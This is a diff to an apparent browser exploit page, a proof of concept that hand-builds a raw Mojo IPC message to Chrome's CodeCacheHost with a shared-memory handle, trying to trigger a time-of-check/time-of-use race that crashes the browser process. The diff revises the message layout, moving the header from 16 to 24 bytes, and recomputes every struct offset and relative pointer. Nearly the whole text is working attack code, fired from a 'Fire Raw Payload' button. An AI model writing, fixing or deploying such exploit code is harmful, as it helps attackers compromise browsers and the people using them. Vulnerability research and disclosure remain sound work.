@@ -4,7 +4,7 @@
     <title>CodeCacheHost Raw IPC TOCTOU</title>
 </head>
 <body>
-    <h1>Raw Mojo TOCTOU Exploit</h1>
+    <h1>Mojo TOCTOU Exploit</h1>
     <button id="pwn">Fire Raw Payload</button>
 
     <script>
@@ -32,64 +32,66 @@
 
             console.log("[*] Forging C++ Structs in memory...");
 
-            // 3. PACK THE RAW IPC MESSAGE (136 Bytes Total)
-            const msg = new ArrayBuffer(136);
+            // 3. PACK THE RAW IPC MESSAGE (144 Bytes Total)
+            const msg = new ArrayBuffer(144);
             const msgView = new DataView(msg);
 
-            // --- MOJO MESSAGE HEADER (16 Bytes) ---
-            msgView.setUint32(0, 16, true);  // Header Size (Strictly 16)
+            // --- MOJO MESSAGE HEADER (24 Bytes) ---
+            msgView.setUint32(0, 24, true);  // Header Size (Strictly 24 for MessageV0)
             msgView.setUint32(4, 0, true);   // Version 0
             msgView.setUint32(8, 0, true);   // Interface ID
             msgView.setUint32(12, 1, true);  // Message ID (1 = DidGenerateCacheableMetadata)
+            msgView.setUint32(16, 0, true);  // Flags
+            msgView.setUint32(20, 0, true);  // Padding
 
-            // --- PARAMS STRUCT (48 Bytes, starts at offset 16) ---
-            msgView.setUint32(16, 48, true); // Struct size (8 byte header + 40 bytes fields)
-            msgView.setUint32(20, 0, true);  // Version
-            msgView.setUint32(24, 0, true);  // CodeCacheType (0 = Javascript)
-            msgView.setUint32(28, 0, true);  // Padding
+            // --- PARAMS STRUCT (48 Bytes, starts at offset 24) ---
+            msgView.setUint32(24, 48, true); // Struct size
+            msgView.setUint32(28, 0, true);  // Version
+            msgView.setUint32(32, 0, true);  // CodeCacheType (0 = Javascript)
+            msgView.setUint32(36, 0, true);  // Padding
             
-            // Relative Pointer to URL struct (Placed at offset 64. Math: 64 - 32 = 32)
-            msgView.setBigUint64(32, 32n, true); 
-            // Relative Pointer to Time struct (Placed at offset 104. Math: 104 - 40 = 64)
-            msgView.setBigUint64(40, 64n, true); 
+            // Relative Pointer to URL struct (Placed at offset 72. Math: 72 - 40 = 32)
+            msgView.setBigUint64(40, 32n, true); 
+            // Relative Pointer to Time struct (Placed at offset 112. Math: 112 - 48 = 64)
+            msgView.setBigUint64(48, 64n, true); 
 
-            // BigBuffer Union (Inline at offset 48, 16 Bytes)
-            msgView.setUint32(48, 16, true); // Union size
-            msgView.setUint32(52, 1, true);  // Union tag (1 = shared_memory)
-            // Relative Pointer to SharedMemory struct (Placed at offset 120. Math: 120 - 56 = 64)
-            msgView.setBigUint64(56, 64n, true); 
+            // BigBuffer Union (Inline at offset 56, 16 Bytes)
+            msgView.setUint32(56, 16, true); // Union size
+            msgView.setUint32(60, 1, true);  // Union tag (1 = shared_memory)
+            // Relative Pointer to SharedMemory struct (Placed at offset 128. Math: 128 - 64 = 64)
+            msgView.setBigUint64(64, 64n, true); 
 
-            // --- URL STRUCT (16 Bytes, starts at offset 64) ---
-            msgView.setUint32(64, 16, true); // Size
-            msgView.setUint32(68, 0, true);  // Version
-            // Relative Pointer to String data (Placed at offset 80. Math: 80 - 72 = 8)
-            msgView.setBigUint64(72, 8n, true); 
+            // --- URL STRUCT (16 Bytes, starts at offset 72) ---
+            msgView.setUint32(72, 16, true); // Size
+            msgView.setUint32(76, 0, true);  // Version
+            // Relative Pointer to String data (Placed at offset 88. Math: 88 - 80 = 8)
+            msgView.setBigUint64(80, 8n, true); 
 
-            // --- STRING DATA (24 Bytes, starts at offset 80) ---
-            msgView.setUint32(80, 24, true); // Array size (8 header + 12 chars + 4 pad)
-            msgView.setUint32(84, 12, true); // Num chars
+            // --- STRING DATA (24 Bytes, starts at offset 88) ---
+            msgView.setUint32(88, 24, true); // Array size (8 byte header + 12 chars + 4 byte padding)
+            msgView.setUint32(92, 12, true); // Num chars
             const urlStr = "http://a.com";
             for(let i = 0; i < 12; i++) {
-                msgView.setUint8(88 + i, urlStr.charCodeAt(i));
+                msgView.setUint8(96 + i, urlStr.charCodeAt(i));
             }
 
-            // --- TIME STRUCT (16 Bytes, starts at offset 104) ---
-            msgView.setUint32(104, 16, true);
-            msgView.setUint32(108, 0, true);
-            msgView.setBigUint64(112, 0n, true); // internal_value
+            // --- TIME STRUCT (16 Bytes, starts at offset 112) ---
+            msgView.setUint32(112, 16, true);
+            msgView.setUint32(116, 0, true);
+            msgView.setBigUint64(120, 0n, true); // internal_value
 
-            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 120) ---
-            msgView.setUint32(120, 16, true);
-            msgView.setUint32(124, 0, true);
-            msgView.setUint32(128, 0, true); // Handle Index (Points to the 0th element in our handle array below)
-            msgView.setUint32(132, bufferSize, true); // Buffer Size
+            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 128) ---
+            msgView.setUint32(128, 16, true);
+            msgView.setUint32(132, 0, true);
+            msgView.setUint32(136, 0, true); // Handle Index (Points to the 0th element in our handle array)
+            msgView.setUint32(140, bufferSize, true); // Buffer Size
 
             console.log("[*] Firing Raw IPC Payload...");
 
             // 4. FIRE THE MESSAGE
             pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
 
-            console.log("[+] Payload Sent. If the race hits, Chrome will SIGSEGV.");
+            console.log("[+] Payload Sent. Check debug log for the crash.");
         }
 
         document.getElementById('pwn').onclick = pwnBrowser;
